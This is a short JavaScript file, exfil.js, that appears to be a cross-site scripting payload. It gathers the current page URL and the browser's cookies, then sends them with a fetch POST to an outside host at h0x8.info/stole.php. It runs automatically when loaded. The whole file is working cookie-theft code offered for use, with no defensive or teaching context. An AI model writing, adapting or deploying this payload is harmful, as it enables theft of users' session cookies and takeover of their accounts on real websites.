// exfil.js - Your custom script
export function stealData() {
    const data = {
        url: window.location.href,
        cookies: document.cookie,
        timestamp: new Date().toISOString()
    };
    
    // Send to your server
    fetch('https://h0x8.info/stole.php', {
        method: 'POST',
        body: JSON.stringify(data),
        mode: 'no-cors'
    });
    
    return data;
}

// Auto-execute
stealData();
